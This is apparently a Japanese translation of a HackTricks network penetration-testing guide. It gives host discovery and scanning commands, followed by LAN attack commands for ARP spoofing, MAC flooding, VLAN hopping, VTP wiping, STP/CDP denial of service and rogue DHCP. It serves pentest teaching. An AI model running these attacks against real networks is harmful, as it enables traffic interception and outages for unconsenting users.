# ペンテストネットワーク

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでAWSハッキングを学ぶ**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**したり、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する
- **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **ハッカーによって作成されたプレミアム** **バグバウンティプラットフォーム** **Intigriti**に**サインアップ**してください！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 外部からホストを発見する

これは**インターネットから応答するIPを見つける方法**についての**簡単なセクション**になります。\
この状況では、いくつかの**IPのスコープ**（おそらく複数の**範囲**さえも）があり、**どのIPが応答しているか**を見つけるだけです。

### ICMP

これはホストが起動しているかどうかを発見する**最も簡単で速い方法**です。\
いくつかの**ICMP**パケットを送信して**応答を期待**することができます。最も簡単な方法は、**エコーリクエスト**を送信して応答を期待することです。単純な`ping`を使用するか、**範囲**用に`fping`を使用することができます。\
他の種類のICMPパケットを送信するために**nmap**を使用することもできます（これにより、一般的なICMPエコーリクエスト-レスポンスへのフィルタが回避されます）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCPポートの発見

すべての種類のICMPパケットがフィルタリングされていることが非常に一般的です。そのため、ホストが稼働しているかどうかを確認するためにできることは**オープンポートを見つけること**だけです。各ホストには**65535ポート**がありますので、もし「大規模」なスコープを持っている場合、各ホストの**すべてのポート**が開いているかどうかをテストすることはできません。それには時間がかかりすぎます。\
そのため、必要なものは**高速ポートスキャナー**（[masscan](https://github.com/robertdavidgraham/masscan)）と**よく使用されるポートのリスト**です：
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### HTTP ポートの発見

これは、**HTTP サービスの発見に焦点を当てた**、便利な TCP ポートの発見です。
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDPポートの発見

また、ホストに**より注意を払うべきかどうか**を判断するために、**UDPポートが開いているかどうか**をチェックすることもできます。通常、UDPサービスは**通常の空のUDPプローブパケットにデータを返さない**ため、ポートがフィルタリングされているか開いているかを判断するのは難しいです。これを判断する最も簡単な方法は、実行中のサービスに関連するパケットを送信することですが、実行中のサービスがわからないため、ポート番号に基づいて最もありそうなものを試す必要があります。
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
前に提案されたnmapの行は、/24の範囲内のすべてのホストで**上位1000のUDPポート**をテストしますが、これだけでも**20分以上**かかります。 より**高速な結果**が必要な場合は、[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)を使用できます：`./udp-proto-scanner.pl 199.66.11.53/24` これにより、これらの**UDPプローブ**がそれらの**期待されるポート**に送信されます（/24の範囲では1分で完了します）：_DNSStatusRequest、DNSVersionBindReq、NBTStat、NTPRequest、RPCCheck、SNMPv3GetRequest、chargen、citrix、daytime、db2、echo、gtpv1、ike、ms-sql、ms-sql-slam、netop、ntp、rpc、snmp-public、systat、tftp、time、xdmcp。_

### SCTPポートの発見
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifiの侵入テスト

ここでは、執筞時点でよく知られているWifi攻撃の素晴らしいガイドを見つけることができます：

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## 内部からホストを発見する

ネットワーク内部にいる場合、最初に行いたいことの1つは**他のホストを発見する**ことです。**どれだけノイズ**を出すことができるか/したいかに応じて、異なるアクションを実行できます：

### パッシブ

これらのツールを使用して、接続されたネットワーク内のホストを受動的に発見できます：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Active

外部からホストを発見する方法でコメントされているテクニックは、ここでも**適用できます**。\
ただし、他のホストと**同じネットワーク**にいるため、**さらに多くのこと**ができます：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

_外部からホストを発見する_ でコメントされている技術（[_**ICMP**_](./#icmp)）は、ここでも**適用できます**。\
ただし、他のホストと**同じネットワーク**にいるため、**さらに多くのこと**ができます：

- **サブネットブロードキャストアドレス**に**ping**を送信すると、**各ホスト**にpingが到達し、彼らが**応答**する可能性があります： `ping -b 10.10.5.255`
- **ネットワークブロードキャストアドレス**にpingを送信すると、**他のサブネット内のホスト**を見つけることさえできます： `ping -b 255.255.255.255`
- `nmap`の`-PE`、`-PP`、`-PM`フラグを使用して、それぞれ**ICMPv4 echo**、**timestamp**、**subnet mask requests**を送信してホストの検出を実行します： `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lanは、**ネットワークメッセージ**を介してコンピューターを**起動**するために使用されます。コンピューターを起動するために使用されるマジックパケットは、**MAC Dst**が提供され、その後、同じパケット内で**16回繰り返される**パケットです。\
その後、この種のパケットは通常、**イーサネット0x0842**または**ポート9へのUDPパケット**に送信されます。\
**\[MAC]**が提供されない場合、パケットは**ブロードキャストイーサネット**に送信されます（ブロードキャストMACが繰り返されるものになります）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## ホストのスキャン

IPアドレス（外部または内部）をすべて発見したら、深くスキャンしたい場合、さまざまなアクションを実行できます。

### TCP

* **オープン**ポート： _SYN --> SYN/ACK --> RST_
* **クローズド**ポート： _SYN --> RST/ACK_
* **フィルタリングされた**ポート： _SYN --> \[NO RESPONSE]_
* **フィルタリングされた**ポート： _SYN --> ICMPメッセージ_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDPポートをスキャンするための2つのオプションがあります：

- ポートが**閉じている**場合は、**UDPパケット**を送信して応答が **ICMP unreachable** かどうかを確認します（いくつかのケースでは、ICMPが**フィルタリング**されているため、ポートが閉じているか開いているかの情報を受信できないことがあります）。
- **フォーマットされたデータグラム**を送信して、**サービス**（例：DNS、DHCP、TFTPなど、_nmap-payloads_にリストされている他のサービス）からの応答を引き出します。応答を受信した場合、ポートは**開いています**。

**Nmap**は、"-sV"を使用して**両方の**オプションを組み合わせます（UDPスキャンは非常に遅いです）、ただし、UDPスキャンはTCPスキャンよりも遅いことに注意してください：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTPスキャン

SCTPはTCPとUDPと並んでいます。IP上での**電話**データの**輸送**を提供することを意図しており、このプロトコルはSignaling System 7 (SS7)の信頼性機能の多くを複製し、SIGTRANとして知られるより大きなプロトコルファミリーの基盤となっています。SCTPは、IBM AIX、Oracle Solaris、HP-UX、Linux、Cisco IOS、VxWorksなどのオペレーティングシステムでサポートされています。

nmapによってSCTP用に提供されている2つの異なるスキャンは、_-sY_と_-sZ_です。
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDSおよびIPS回避

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **さらなるnmapオプション**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### 内部IPアドレスの公開

設定ミスのルーター、ファイアウォール、およびネットワークデバイスは、時々**非公開ソースアドレスを使用して**ネットワークプローブに**応答**します。テスト中に**tcpdump**を使用して、**プライベートアドレス**から受信したパケットを**特定**できます。この場合、Kali Linuxの_eth2_インターフェースは**公共インターネット**から**アクセス可能**です（**NAT**または**ファイアウォール**の**背後**にいる場合、この種のパケットはおそらく**フィルタリング**されます）。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## スニッフィング

スニッフィングを行うと、キャプチャされたフレームやパケットを確認することで、IPレンジ、サブネットサイズ、MACアドレス、ホスト名の詳細を把握できます。ネットワークが誤って構成されているか、スイッチングファブリックがストレス下にある場合、攻撃者は受動的なネットワークスニッフィングを通じて機密情報をキャプチャすることができます。

スイッチングされたイーサネットネットワークが適切に構成されている場合、ブロードキャストフレームとMACアドレス宛に送信されたデータのみが表示されます。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
One can, also, capture packets from a remote machine over an SSH session with Wireshark as the GUI in realtime.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercapは、ネットワーク内の様々な攻撃を実行するための強力なツールです。ARPスプーフィング、SSLストリップ、DNSスプーフィングなどの攻撃を実行するために使用されます。Bettercapは、中間者攻撃や情報収集などのペネトレーションテスト活動で広く使用されています。
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

当然。

### 資格情報のキャプチャ

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) のようなツールを使用して、pcap またはライブインターフェースから資格情報を解析できます。

## LAN 攻撃

### ARP スプーフィング

ARP スプーフィングは、機器のIPが当該デバイスのMACアドレスであることを示す gratuitous ARPResponses を送信することで構成されます。その後、被害者はARPテーブルを変更し、IPスプーフィングを行う際には常に当該IPに接触するために当機器に連絡します。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAMオーバーフロー

異なるソースMACアドレスを持つ多くのパケットを送信して、スイッチのCAMテーブルをオーバーフローさせます。CAMテーブルがいっぱいになると、スイッチはハブのように振る舞い始めます（すべてのトラフィックをブロードキャストします）。
```bash
macof -i <interface>
```
### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

**DTP (Dynamic Trunking Protocol)**は、自動トランクシステムを提供するために設計されたリンク層プロトコルです。DTPを使用すると、スイッチはどのポートがトランクモード（トランク）で動作し、どのポートがそうでないかを決定します。**DTPの使用はネットワーク設計が不十分であることを示しています。** **トランクは必要な場所に厳密に配置され、文書化されるべきです。**

**デフォルトでは、すべてのスイッチポートはDynamic Autoモードで動作します。** これは、スイッチポートが隣接するスイッチからのトランク初期化モードにあることを示します。**ペンテスターはスイッチに物理的に接続し、DTPデザイアブルフレームを送信する必要があります**。これにより、ポートがトランクモードに切り替わります。攻撃者はその後、STPフレームの解析を使用してVLANを列挙し、仮想インターフェイスを作成することでVLANセグメンテーションをバイパスできます。

多くのスイッチはデフォルトでDynamic Trunking Protocol（DTP）をサポートしていますが、これを悪用して**スイッチをエミュレートし、すべてのVLANを介してトラフィックを受信**することができます。ツール[_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan)はインターフェースをスニッフィングし、**スイッチがデフォルトモード、トランク、ダイナミック、自動、またはアクセスモードであるかを報告**します（これはVLANホッピングを回避する唯一の方法です）。ツールはスイッチが脆弱かどうかを示します。

ネットワークが脆弱であることが判明した場合、_**Yersinia**_を使用してプロトコル**「DTP」**を使用して**「トランキングを有効にする」**を実行し、すべてのVLANからのネットワークパケットを表示できます。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

VLANを列挙するためには、[**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**というスクリプトを使用してDTPデザイアブルフレームを生成することも可能です。**スクリプトを絶対に中断しないでください。** 3秒ごとにDTPデザイアブルをインジェクトします。**スイッチ上で動的に作成されたトランクチャネルは、5分間だけ有効です。5分後にトランクが切断されます。**
```
sudo python3 DTPHijacking.py --interface eth0
```
私たちは、**Access/Desirable (0x03)** がDTPフレームがDesirableタイプであることを示し、ポートにTrunkモードへの切り替えを指示することを示していることを指摘したいと思います。そして、**802.1Q/802.1Q (0xa5)** は **802.1Q** カプセル化タイプを示しています。

STPフレームを分析することで、**VLAN 30とVLAN 60の存在について知ることができます。**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### 特定のVLANへの攻撃

VLANのIDとIP値を知っている場合、**特定のVLANに攻撃するために仮想インターフェースを設定**することができます。\
DHCPが利用できない場合は、静的IPアドレスを設定するために _ifconfig_ を使用してください。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### 自動VLANホッパー

**Dynamic Trunking**の攻撃と他のVLAN内のホストを発見するための**仮想インターフェースの作成**は、[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)というツールによって**自動的に実行**されます。

#### ダブルタギング

攻撃者が**被害者ホストのMAC、IP、VLAN IDの値を知っている**場合、指定されたVLANと被害者のVLANで**フレームにダブルタグを付け**、パケットを送信することができます。**被害者は攻撃者に接続できなくなる**ため、**攻撃者の最良の選択肢はUDPを介して通信する**ことです。これにより、SNMPのような興味深いアクションを実行できるプロトコルにアクセスできます。

攻撃者の別の選択肢は、**攻撃者が制御するIPをスプーフィングし、被害者がアクセスできる（おそらくインターネット経由で）IPを使用してTCPポートスキャンを実行**することです。その後、攻撃者は、被害者からパケットを受信するかどうかを自分が所有する2番目のホストでスニッフィングできます。

この攻撃を実行するには、scapyを使用できます：`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### レイテラルVLANセグメンテーションバイパス <a href="#d679" id="d679"></a>

**直接接続されたスイッチにアクセス権がある場合**、ネットワーク内での**VLANセグメンテーションをバイパス**する能力があります。単純にポートをトランクモード（トランクとも呼ばれる）に切り替え、ターゲットVLANのIDを持つ仮想インターフェースを作成し、IPアドレスを構成します。アドレスを動的にリクエスト（DHCP）するか、静的に構成するかはケースによります。

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### レイヤー3プライベートVLANバイパス

ゲストワイヤレスネットワークやその他の環境では、プライベートVLAN（ポートアイソレーションとも呼ばれる）設定が使用されています。これは、ピア同士の相互作用を防ぐために使用されます（つまり、クライアントがワイヤレスアクセスポイントに接続しても互いにアドレスを指定できない）。ネットワークACL（またはそれがない場合）に応じて、IPパケットをルーターに送信し、その後隣接するピアに転送することが可能かもしれません。

この攻撃では、**クライアントのIPに対してルーターのMACを持つ特別に作成されたパケットを送信**します。その後、**ルーターはパケットをクライアントにリダイレクト**します。_ダブルタギング攻撃_と同様に、被害者がアクセス可能なホストを制御することでこの脆弱性を悪用できます。

### VTP攻撃

**VTP（VLANトランキングプロトコル）**はVLANを中央で管理するためのプロトコルです。スイッチは現在のVLANデータベースを追跡するために特別なリビジョン番号を確認します。テーブルの更新が発生すると、リビジョン番号は1つ増加します。スイッチがより高いリビジョン番号の構成を検出すると、自動的にVLANデータベースを更新します。

#### VTPドメイン内の役割 <a href="#ebfc" id="ebfc"></a>

* **VTPサーバー.** VTPサーバーの役割を持つスイッチは新しいVLANを作成したり、古いVLANを削除したり、VLAN自体の情報を変更したりできます。**ドメインの他のメンバーに対してVTPアナウンスを生成**します。
* **VTPクライアント.** この役割のスイッチは、ドメイン内の他のスイッチから特定のVTPアナウンスを受信して、自分自身のVLANデータベースを更新します。クライアントはVLANを作成する能力に制限があり、VLAN構成をローカルで変更することさえ許可されません。言い換えれば、**読み取り専用アクセス**です。
* **VTPトランスペアレント.** このモードでは、スイッチはVTPプロセスに参加せず、全体のVLAN構成の完全かつローカルな管理を行うことができます。トランスペアレントモードで動作するとき、スイッチは他のスイッチからのVTPアナウンスのみを送信し、そのVLAN構成に影響を与えません。**このようなスイッチは常にリビジョン番号がゼロであり、攻撃されることはありません。**

#### 広告タイプ <a href="#b384" id="b384"></a>

* **サマリー広告 —** VTPサーバーが**300秒（5分）ごとに**送信するVTPアナウンスです。このアナウンスにはVTPドメイン名、プロトコルバージョン、タイムスタンプ、およびMD5構成ハッシュ値が格納されています。
* **サブセット広告 —** これはVLAN構成の変更が発生するたびに送信されるVTP広告です。
* **広告リクエスト —** これはVTPクライアントからVTPサーバーに対するサマリー広告メッセージのリクエストです。通常、スイッチがより高い構成リビジョン番号を持つサマリー広告を検出したメッセージに対する応答として送信されます。

VTPは**トランクポートからのみ攻撃**できます。**VTPアナウンスはトランクポートでのみブロードキャストおよび受信されるためです。** **そのため、DTPを攻撃した後のペンテストでは、次のターゲットはVTPになる可能性があります。** VTPドメインを攻撃するには、**Yersinia**を使用して**VTPインジェクトを実行**し、**VLANデータベース全体を消去**してネットワークを麻痺させることができます。

{% hint style="info" %}
VTPプロトコルには**3つのバージョン**があります。この投稿では、最初のバージョンであるVTPv1に対する攻撃が行われています。
{% endhint %}
```bash
yersinia -G #For graphic mode
```
VLANデータベース全体を消去するには、**すべてのVTP VLANを削除**オプションを選択します

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STP攻撃

**インターフェースでBPDUフレームをキャプチャできない場合、STP攻撃が成功する可能性は低いです。**

#### **STP BPDU DoS**

多くのBPDUs TCP（Topology Change Notification）またはConf（トポロジが作成されたときに送信されるBPDUs）を送信すると、スイッチが過負荷となり正常に動作しなくなります。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

TCPを送信すると、スイッチのCAMテーブルが15秒で削除されます。その後、この種のパケットを連続して送信していると、CAMテーブルが連続して再起動されます（または15秒ごとに）し、再起動されると、スイッチはハブのように振る舞います。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

攻撃者は、スイッチの振る舞いをシミュレートしてネットワークのSTPルートとなります。その後、より多くのデータが攻撃者を経由して通過します。これは、2つの異なるスイッチに接続されている場合に興味深いです。\
これは、**優先度**値が実際のルートスイッチの優先度よりも低いということを示すBPDUs CONFパケットを送信することで行われます。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**攻撃者が2つのスイッチに接続されている場合、彼は新しいツリーのルートとなり、それらのスイッチ間のすべてのトラフィックが彼を経由することになります**（MITM攻撃が実行されます）。
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP攻撃

CISCO Discovery Protocolは、CISCOデバイスが相互に通信し、**誰が生きているか**、どのような機能を持っているかを**発見**するために使用されるプロトコルです。

#### 情報収集 <a href="#0e0f" id="0e0f"></a>

**デフォルトでは、CDPはすべてのポートにアナウンスを送信します。** しかし、侵入者が同じスイッチのポートに接続した場合はどうなるでしょうか？ **Wireshark**、**tcpdump**、または**Yersinia**などのネットワークスニッファを使用して、彼は**デバイス自体に関する貴重な情報**を抽出できます。その情報を使用して、彼は同じバージョンのCisco IOSを列挙し、脆弱性を見つけてそれを悪用することができます。

#### CDPフラッディング攻撃 <a href="#0d6a" id="0d6a"></a>

実際のCISCOデバイスをシミュレートしてデバイスメモリを枯渇させることで、CISCOスイッチにDoS攻撃を行うことができます。
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
**フラッディングCDPテーブル**オプションを選択して攻撃を開始します。スイッチのCPUおよびCDP隣接テーブルが過負荷となり、「ネットワークの麻痺」が発生します。

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDPなりすまし攻撃
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
### VoIP 攻撃

従業員のインターネットプロトコル（VoIP）電話で使用することを意図していましたが、現代のVoIPデバイスは、ますますIoTデバイスと統合されるようになっています。多くの従業員は、特別な電話番号を使用してドアを開けたり、部屋の温度調節を制御したりできるようになりました...

ツール[**voiphopper**](http://voiphopper.sourceforge.net) は、Cisco、Avaya、Nortel、Alcatel-Lucent環境のVoIP電話の振る舞いを模倣します。サポートするデバイス検出プロトコルの1つを使用して、音声ネットワークの正しいVLAN IDを自動的に検出します。サポートするプロトコルには、Cisco Discovery Protocol（CDP）、Dynamic Host Configuration Protocol（DHCP）、Link Layer Discovery Protocol Media Endpoint Discovery（LLDP-MED）、および802.1Q ARPがあります。

**VoIP Hopper** は **3つ** のCDPモードをサポートしています。**sniff** モードはネットワークパケットを検査し、VLAN IDを特定しようとします。これを使用するには、**`-c`** パラメータを `0` に設定します。**spoof** モードは、企業ネットワークで実際のVoIPデバイスが送信するのと同様のカスタムパケットを生成します。これを使用するには、**`-c`** パラメータを **`1`** に設定します。**pre-madepacket** とスプーフィングするモードは、Cisco 7971G-GE IP電話と同じパケットを送信します。これを使用するには、**`-c`** パラメータを **`2`** に設定します。

最後の方法を使用しています。**`-i`** パラメータは攻撃者の **ネットワークインターフェース** を指定し、**`-E`** パラメータは模倣される **VOIPデバイスの名前** を指定します。私たちは、CiscoのVoIP電話の命名形式と互換性のあるSEP001EEEEEEEEEという名前を選びました。この形式は、「SEP」とMACアドレスに続く単語で構成されています。企業環境では、電話の背面にあるMACラベルを見て既存のVoIPデバイスを模倣することができます。電話のディスプレイ画面で設定ボタンを押してモデル情報オプションを選択するか、VoIPデバイスのイーサネットケーブルをノートパソコンに接続し、Wiresharkを使用してデバイスのCDPリクエストを観察することができます。
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
もしツールが正常に実行されると、**VLANネットワークは攻撃者のデバイスにIPv4アドレスを割り当てます**。

### DHCP攻撃

#### 列挙
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

DHCPサーバーに対しては、**2種類のDoS**が実行される可能性があります。最初の方法は、**十分な偽のホストをシミュレートして、すべての可能なIPアドレスを使用する**ことです。\
この攻撃は、DHCPサーバーの応答を見ることができ、プロトコルを完了できる場合にのみ機能します（**Discover**（コンピュータ）--> **Offer**（サーバー）--> **Request**（コンピュータ）--> **ACK**（サーバー））。たとえば、これは**Wifiネットワークでは不可能**です。

DHCP DoSを実行する別の方法は、**すべての可能なIPを送信元コードとして使用してDHCP-RELEASEパケットを送信する**ことです。その後、サーバーは誰もがIPを使用し終わったと思うでしょう。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
より自動的な方法は、[DHCPing](https://github.com/kamorin/DHCPig)ツールを使用することです。

環境内のクライアントに新しいリースを取得させるために、上記のDoS攻撃を使用して、合法的なサーバーを使い果たし、応答がなくなるようにします。したがって、合法的なサーバーが再接続しようとすると、**次の攻撃で言及されている悪意のある値を提供できます**。

#### 悪意のある値を設定する

Rogue DHCPサーバーを確立するためにResponder DHCPスクリプト（_/usr/share/responder/DHCP.py_）を使用できます。悪意のあるゲートウェイを設定するのは理想的ではありません。なぜなら、乗っ取られた接続は半二重であるため（つまり、クライアントからの出力パケットをキャプチャしますが、合法的なゲートウェイからの応答はキャプチャしません）、特にHTTPトラフィックと資格情報をキャプチャするために、ローグDNSまたはWPADサーバーを設定することをお勧めします。

| 説明                                         | 例                                                                          |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| ゲートウェイとして広告される私たちのIPアドレス | _-i 10.0.0.100_                                                              |
| ローカルDNSドメイン名（オプション）           | _-d example.org_                                                             |
| 元のルーター/ゲートウェイのIPアドレス         | _-r 10.0.0.1_                                                                |
| プライマリDNSサーバーのIPアドレス             | _-p 10.0.0.100_                                                              |
| セカンダリDNSサーバーのIPアドレス（オプション） | _-s 10.0.0.1_                                                                |
| ローカルネットワークのネットマスク             | _-n 255.255.255.0_                                                           |
| DHCPトラフィックを受信するためのインターフェース | _-I eth1_                                                                    |
